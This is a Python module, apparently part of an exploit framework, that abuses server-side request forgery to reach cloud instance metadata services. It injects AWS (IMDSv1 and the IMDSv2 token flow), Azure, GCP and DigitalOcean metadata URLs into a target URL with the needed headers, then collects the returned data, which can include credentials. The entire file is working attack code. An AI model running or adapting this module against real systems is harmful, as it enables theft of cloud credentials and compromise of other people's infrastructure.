from modules.exploit_manager import BaseModule
from utils.logger import Logger

class CloudMetadata(BaseModule):
    TARGETS = {
        "aws_v1": "http://169.254.169.254/latest/meta-data/",
        "aws_v2_token": "http://169.254.169.254/latest/api/token",
        "aws_v2_data": "http://169.254.169.254/latest/meta-data/",
        "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "gcp": "http://metadata.google.internal/computeMetadata/v1/",
        "digitalocean": "http://169.254.169.254/metadata/v1.json"
    }

    async def run(self, target_url: str, **kwargs):
        results = {}
        
        # Test AWS IMDSv1
        Logger.info("Testing AWS IMDSv1...")
        res = await self.engine.get(target_url.replace("SSRF", self.TARGETS["aws_v1"]))
        if res.get("status") == 200:
            Logger.success("Potential AWS IMDSv1 access detected!")
            results["aws_v1"] = res["body"]

        # Test AWS IMDSv2 (Advanced)
        Logger.info("Testing AWS IMDSv2...")
        token_headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
        token_res = await self.engine.request("PUT", target_url.replace("SSRF", self.TARGETS["aws_v2_token"]), headers=token_headers)
        if token_res.get("status") == 200:
            token = token_res["body"]
            data_res = await self.engine.get(target_url.replace("SSRF", self.TARGETS["aws_v2_data"]), headers={"X-aws-ec2-metadata-token": token})
            if data_res.get("status") == 200:
                Logger.success("AWS IMDSv2 access confirmed!")
                results["aws_v2"] = data_res["body"]

        # Test Azure
        Logger.info("Testing Azure Metadata...")
        res = await self.engine.get(target_url.replace("SSRF", self.TARGETS["azure"]), headers={"Metadata": "true"})
        if res.get("status") == 200:
            Logger.success("Azure Metadata access detected!")
            results["azure"] = res["body"]

        # Test GCP
        Logger.info("Testing GCP Metadata...")
        res = await self.engine.get(target_url.replace("SSRF", self.TARGETS["gcp"]), headers={"Metadata-Flavor": "Google"})
        if res.get("status") == 200:
            Logger.success("GCP Metadata access detected!")
            results["gcp"] = res["body"]

        return results
